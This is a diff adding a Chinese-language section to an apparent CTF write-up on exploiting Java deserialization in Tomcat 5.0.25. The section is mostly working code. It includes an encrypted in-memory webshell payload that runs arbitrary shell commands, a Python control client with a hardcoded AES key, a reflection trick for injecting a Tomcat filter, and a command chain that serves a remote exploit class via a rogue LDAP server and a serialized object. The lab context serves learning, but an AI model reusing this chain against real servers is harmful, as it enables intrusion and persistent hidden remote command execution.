@@ -955,3 +955,157 @@ curl http://localhost:28080/object --data-binary @object.ser
 
 ![](assets/003.png)
 
+### 内存马再尝试
+
+回头想起来有一个项目他的做法和传统做法不同，虽然我们还是不能链接，但是我们自己写个 client 也完全可以实现管理。
+AgentMemshell 的 vybeX 协议 + version 48 编译的 equals 分派 payload + 自研 Python 客户端
+
+ `vybeX.AuthAgentFilterChain` 的协议，payload 不依赖 Godzilla 的 `handle()` 约定，只重写一个 `equals(Object)` 做 instanceof 分派。协议如下：
+
+```
+User-Agent: avZplwxE
+POST /?RIZpWiOg=base64(AES/ECB/PKCS5(数据, key=0d30740ba99db1d6))
+首次请求   → defineClass payload 类，空响应
+之后请求   → 命令数据，响应 = 4844DA5E7FDDFEF9 + base64(AES(输出)) + 6B205FFF28E0337E
+```
+
+服务端把 vybeX 的 `equals(Object[])` 约定内联进 `Filter.doFilter`（`memshell/GodzillaFilter.java`，含 base64 的 `java.util.Base64`→`sun.misc.BASE64Decoder` 回退、无 `String.contains` 等 JDK 1.4 兼容改造）。payload 是 `memshell/Pwn.java`：
+
+```java
+import java.io.ByteArrayOutputStream;
+import java.io.InputStream;
+import java.io.PrintWriter;
+import javax.servlet.http.HttpServletRequest;
+
+/*
+ * Payload class defined in the memshell on demand (first Godzilla request).
+ * Compiled with -source 1.4 -target 1.4 (class version 48) so JDK 1.4.2's
+ * defineClass accepts it. Dispatches via equals(Object) instanceof checks,
+ * executes the command in toString() and writes output to the BAOS passed in.
+ */
+public class Pwn {
+    private byte[] data;
+    private ByteArrayOutputStream out;
+    private HttpServletRequest request;
+
+    public boolean equals(Object obj) {
+        if (obj instanceof ByteArrayOutputStream) {
+            out = (ByteArrayOutputStream) obj;
+            return true;
+        }
+        if (obj instanceof HttpServletRequest) {
+            request = (HttpServletRequest) obj;
+            return true;
+        }
+        if (obj instanceof byte[]) {
+            data = (byte[]) obj;
+            return true;
+        }
+        return false;
+    }
+
+    public String toString() {
+        try {
+            Process proc = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", new String(data, "UTF-8")});
+            InputStream in = proc.getInputStream();
+            ByteArrayOutputStream b = new ByteArrayOutputStream();
+            byte[] buf = new byte[4096];
+            int n;
+            while ((n = in.read(buf)) > 0) {
+                b.write(buf, 0, n);
+            }
+            in.close();
+            proc.waitFor();
+            out.write(b.toByteArray());
+        } catch (Exception e) {
+            try {
+                ByteArrayOutputStream eb = new ByteArrayOutputStream();
+                e.printStackTrace(new PrintWriter(eb));
+                out.write(eb.toByteArray());
+            } catch (Exception ignored) {
+            }
+        }
+        return "";
+    }
+}
+```
+
+编译还是用容器内的 jdk，用 `javac -source 1.4 -target 1.4` 编译成 class version 48，JDK 1.4.2 的 `defineClass` 直接接受。
+
+客户端用 pycryptodome 写
+
+```python
+#!/usr/bin/env python3
+import base64
+import os
+import sys
+import requests
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+
+KEY = b"0d30740ba99db1d6"
+PREFIX = "4844DA5E7FDDFEF9"
+SUFFIX = "6B205FFF28E0337E"
+
+TARGET = sys.argv[1].rstrip("/") + "/"
+CMD = sys.argv[2] if len(sys.argv) > 2 else "/readflag"
+PAYLOAD = sys.argv[3] if len(sys.argv) > 3 else os.path.join(
+    os.path.dirname(os.path.abspath(__file__)), "classes", "Pwn.class")
+
+
+def encrypt(data):
+    return AES.new(KEY, AES.MODE_ECB).encrypt(pad(data, 16))
+
+
+def decrypt(data):
+    return unpad(AES.new(KEY, AES.MODE_ECB).decrypt(data), 16)
+
+
+def send(data):
+    return requests.post(TARGET, params={"RIZpWiOg": base64.b64encode(encrypt(data)).decode()},
+                         headers={"User-Agent": "avZplwxE"}, timeout=15)
+
+
+send(open(PAYLOAD, "rb").read())
+r = send(CMD.encode())
+body = r.content
+assert body.startswith(PREFIX.encode()) and body.endswith(SUFFIX.encode())
+print(decrypt(base64.b64decode(body[len(PREFIX):len(body) - len(SUFFIX)])).decode(errors="replace"))
+```
+
+测试复现`StandardContext.filterMaps` 在 Tomcat 5.0.25 里是 `FilterMap[]` 数组而不是 `ArrayList`，直接 `((List) field.get(context)).add(...)` 抛 `ClassCastException`。
+要扩容数组后 `set` 回去
+
+```java
+Object[] oldMaps = (Object[]) fMaps.get(context);
+Object[] newMaps = (Object[]) java.lang.reflect.Array.newInstance(
+        oldMaps.getClass().getComponentType(), oldMaps.length + 1);
+System.arraycopy(oldMaps, 0, newMaps, 0, oldMaps.length);
+newMaps[oldMaps.length] = filterMap;
+fMaps.set(context, newMaps);
+```
+
+执行命令
+
+```bash
+JDK8=/Library/Java/JavaVirtualMachines/jdk1.8.0_66.jdk/Contents/Home
+
+
+unzip -o docker/jakarta-tomcat-5.0.25.zip "jakarta-tomcat-5.0.25/common/lib/servlet-api.jar" -d /tmp/
+$JDK8/bin/javac -source 1.4 -target 1.4 \
+  -cp /tmp/jakarta-tomcat-5.0.25/common/lib/servlet-api.jar \
+  -d memshell/classes memshell/GodzillaFilter.java memshell/Pwn.java memshell/Exploit.java
+
+
+cd memshell/classes && python3 -m http.server 8888
+python3 exploit/ldap_server.py 1389 "http://host.docker.internal:8888/" "Exploit" &
+curl http://localhost:28080/object --data-binary @exploit/object.ser
+
+python3 memshell/godzilla_client.py http://127.0.0.1:28080/ "cat /flag"
+```
+
+![](assets/004.png)
+![](assets/005.png)
+
+> https://github.com/FightingLzn9/AgentMemshell/releases/tag/v1
+
